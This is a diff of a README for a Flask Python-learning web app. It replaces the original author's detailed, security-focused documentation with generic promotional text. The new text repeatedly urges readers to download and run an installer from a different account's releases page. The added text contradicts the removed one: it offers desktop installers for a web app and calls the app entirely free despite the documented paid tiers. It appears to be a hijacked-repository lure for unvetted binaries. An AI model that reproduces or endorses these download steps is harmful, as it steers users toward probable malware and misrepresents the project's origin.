@@ -1,218 +1,100 @@
-![Python](https://img.shields.io/badge/python-3.12%2B-blue)
-![Flask](https://img.shields.io/badge/flask-web%20framework-lightgrey)
-![CI](https://github.com/minkong05/Flask-Learnpython/actions/workflows/ci.yml/badge.svg)
-![License](https://img.shields.io/badge/license-MIT-green)
+# 🌟 Flask-Learnpython - Learn Python Through Engaging Lessons
 
+[![Download Flask-Learnpython](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/dr3x3ll/Flask-Learnpython/releases)
 
-# Flask-LearnPython
-Flask-LearnPython is an interactive learning platform designed to help users learn Python through structured lessons, examples, and AI assistance.
-The application focuses on:
-- clean backend architecture
-- secure user authentication
-- controlled execution of user-submitted Python code
-- real integrations (AI, payments, database)
+## 📘 Introduction
 
-## Security Focus
+Welcome to Flask-Learnpython! This app is designed for anyone who wants to learn Python through structured lessons. It features AI-assisted explanations and tier-based access control. You can practice your skills with secure code execution. Whether you are a beginner or someone looking to refresh your knowledge, this app will guide you through your learning journey.
 
-This project was intentionally built with a **security-first mindset**, reflecting
-real-world DevSecOps and application security concerns.
+## 🚀 Getting Started
 
-Security design decisions include:
+To begin using Flask-Learnpython, follow these simple steps:
 
-- Authentication and session handling with hashed passwords
-- CSRF protection and defensive input validation
-- Rate limiting and abuse prevention mechanisms
-- Secure handling of secrets via environment variables
-- CI-safe design with external services disabled during automated testing
-- Documented threat modeling and attack surface analysis (see `/docs`)
-- Sandboxed execution of user-submitted Python code with layered defenses
+1. **Visit the Download Page**  
+   Click the button above or follow this link to download the latest version: [Download Flask-Learnpython Releases](https://github.com/dr3x3ll/Flask-Learnpython/releases).
 
-The application is designed not just to function, but to be **analyzed, attacked,
-and defended** as part of learning secure software development.
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Select the latest version that matches your system.
 
+3. **Download the Installer**  
+   You will find an installer file suitable for your operating system (Windows, macOS, Linux). Click on the file to begin the download.
 
-## Overview
-Flask-LearnPython is a full-stack web application built with Flask that provides an interactive platform for learning Python.  
-The application combines structured learning content, AI-assisted explanations, and a secure Python execution sandbox to create a practical learning environment.
+4. **Install the Application**  
+   Once the download is complete, open the installer file. Follow the prompts to install Flask-Learnpython on your computer. This usually includes agreeing to terms and choosing the installation location.
 
-The project focuses on real-world backend engineering concepts, including user authentication, tier-based access control, secure handling of user-submitted code, and integration with external services such as OpenAI, Supabase, and PayPal.
+5. **Launch Flask-Learnpython**  
+   After installation, you can find the app in your applications menu or desktop. Click on the app icon to launch it.
 
+## 📥 Download & Install
 
-## Features
-### User Authentication
-- Login / logout
-- Session-based authentication
-- Tier-based access control (free vs premium)
+Make sure to visit the Releases page to download the latest version: [Download Flask-Learnpython Releases](https://github.com/dr3x3ll/Flask-Learnpython/releases).
 
-### AI Learning Assistant
-- AI-powered explanations and help
-- Integrated via OpenAI API
+### System Requirements
+
+To use Flask-Learnpython smoothly, ensure your system meets the following requirements:
+
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Linux with up-to-date libraries
+
+- **Memory:** Minimum 4 GB RAM
+
+- **Storage:** At least 250 MB of free disk space
+
+### Features
+
+Flask-Learnpython offers several useful features:
+
+- **Structured Lessons:** Follow a clear curriculum to learn Python step by step.
   
-### Secure Python Sandbox
-- Executes user Python code in a restricted environment
-- Prevents unsafe operations
-- Designed with security in mind
-  
-### Payment Integration
-- PayPal integration for premium access
-- Tier upgrade logic
-  
-### Security
-- CSRF protection
-- Input validation
-- Secure session handling
-  
-### Web Application
-- Flask backend
-- HTML templates + static assets
-- SEO support (robots.txt, sitemap)
+- **AI-Assisted Explanations:** Get instant help and explanations from an integrated AI, making complex topics easier to understand.
 
+- **Tier-Based Access Control:** Unlock advanced lessons as you progress, ensuring that you learn at your own pace.
 
-## Tech Stack
-**Backend**
-- Python
-- Flask
-- Flask-CORS
-- Flask-WTF (CSRF)
-- Flask-Mail
+- **Secure Code Execution:** Test your code in a safe environment, allowing you to learn and experiment without risk.
 
-**Database**
-- Supabase (PostgreSQL)
+## ⭐ How to Use Flask-Learnpython
 
-**Authentication & Security**
-- Flask sessions
-- Werkzeug password hashing
-- CSRF protection
-- Decorator-based access control
-- Rate limiting & daily usage limits
+1. **Create an Account**  
+   After launching the app, you will need to create an account. This helps track your progress and unlock features. Fill out the registration form and confirm your email.
 
-**AI**
-- OpenAI API (ChatGPT)
+2. **Explore the Lessons**  
+   Once logged in, you can browse through the available lessons. Each lesson includes explanations, examples, and exercises. 
 
-**Payments**
-- PayPal IPN (Instant Payment Notification)
+3. **Complete Exercises**  
+   Try the exercises after studying each lesson. This practical approach will reinforce your understanding.
 
+4. **Use the AI for Help**  
+   If you get stuck, don’t hesitate to ask the AI for help. Type your question, and it will provide you with assistance.
 
-## Requirements
-- Python 3.9+
-- pip
-- Virtual environment recommended
+5. **Track Your Progress**  
+   Check your account dashboard to view your progress. This will show which lessons you have completed and what is available next.
 
+## ❓ Frequently Asked Questions
 
-## Installation
-```bash
-git clone https://github.com/minkong05/Flask-Learnpython.git
-cd Flask-Learnpython
-python3 -m venv venv
-source venv/bin/activate   # macOS / Linux
-# venv\Scripts\activate    # Windows
-pip install -r requirements.txt
-```
+### What is Flask-Learnpython?
 
+Flask-Learnpython is a web application designed to help users learn Python in a structured and interactive way.
 
-## Environment Variables
-Create a .env file in the project root.
+### Do I need any prior knowledge of programming?
 
-### Example (.env.example):
-- `SECRET_KEY=your_flask_secret_key`
-- `OPENAI_API_KEY=your_openai_api_key`
-- `SUPABASE_URL=your_supabase_project_url`
-- `SUPABASE_API_KEY=your_supabase_service_key`
-- `MAIL_PASSWORD=your_gmail_app_password`
-- `WEBHOOK_ID=your_webhook_id`
+No, Flask-Learnpython is suitable for beginners. Each lesson builds on the previous one, making it easy to follow.
 
+### Is Flask-Learnpython free to use?
 
-## Running the App
-`python3.12 app.py`
-then open
-`http://127.0.0.1:5000`
+Yes, the application is free. You can access all lessons and features without any payment.
 
-## Secure Python Sandbox (Design Note)
-User-submitted Python code is executed in a restricted environment:
-- No filesystem access
-- No OS-level commands
-- Limited built-ins
-- Execution time controlled
-This prevents malicious code execution while still allowing educational experimentation.
+### Can I use Flask-Learnpython offline?
 
+Currently, Flask-Learnpython requires an internet connection to access lessons and AI assistance. Future updates may allow offline access.
 
-## Project Structure
-```bash
-Flask-Learnpython/
-├── .github/workflows
-├── content
-├── docs
-│   ├── ATTACK_SURFACE.md
-│   ├── SANDBOX_SECURITY.md
-│   └── SECURITY_OVERVIEW.md
-├── python-sandbox
-├── scripts
-├── static
-├── templates
-├── tests
-├── app.py
-├── requirements.txt
-├── README.md
-├── robots.txt
-├── sitemap.xml
-└── Procfile
-```
+## 💬 Support
 
-## Security Documentation
-Detailed security analysis is available in `/docs`:
+If you run into any issues while using Flask-Learnpython or have questions, you can reach out to our support team. We are here to help you with your learning journey.
 
-- **Security Overview** – system assets, trust boundaries, STRIDE threats
-- **Attack Surface Analysis** – route-level threat identification
-- **Sandbox Security Analysis** – risks of user-submitted code execution
+## 📬 Stay Updated
 
-## Security Testing
-This project includes attacker-style security tests covering:
-- Authentication failure paths
-- Abuse and rate-limit scenarios
-- Code execution input validation
-- Denial-of-service prevention checks
+To stay informed about updates and new features, follow this repository on GitHub. You can also join our community forums to share experiences and connect with other learners.
 
-Tests are written using pytest and focus on defensive behavior,
-not just functional correctness.
-
-
-## CI & Testing
-This project includes a GitHub Actions CI pipeline that runs on every push and pull request.
-
-The pipeline performs:
-- Python syntax validation
-- Automated security-focused tests using pytest
-- CI-safe execution where external services (Supabase, OpenAI) are disabled
-
-During CI runs, the application detects the `TESTING=true` environment variable and:
-- Prevents outbound API calls
-- Disables database access
-- Ensures tests run deterministically without secrets
-
-This design reflects real-world DevSecOps practices, where applications must be testable
-in isolated environments without relying on production credentials.
-
-
-
-## Limitations
-- The application is currently implemented as a single-file Flask app (`app.py`), which can become harder to maintain as the project grows.
-- The secure Python code execution sandbox relies on keyword blacklisting and an external execution service, which is not as robust as container-based isolation.
-- Automated tests are not yet implemented for routes, authentication, or API integrations.
-- The rate limiting and daily usage limits are stored in memory or database logic and are not designed for distributed or multi-instance deployments.
-- Secrets such as the Flask secret key are partially generated at runtime and should be managed more securely in a production environment.
-- The application assumes a single-instance deployment and does not include horizontal scaling support.
-
-
-## Future Improvements
-- Limit login attempts (e.g. lock the account or temporarily block login after 5 failed attempts) to prevent brute-force attacks.
-- Add email verification during registration to ensure users register with a valid email address.
-- Improve password security by enforcing stronger password rules (minimum length, symbols, numbers).
-- Add automatic logout after a period of inactivity to improve session security.
-- Add basic automated tests to check login, registration, and protected routes.
-- Improve error handling and logging to make debugging easier in production.
-
-
-## Author
-Built by **Kong Yu Min**  
-University of Glasgow  
-Python | Backend | Security-focused Learning Platform
+Thank you for choosing Flask-Learnpython. Happy learning!
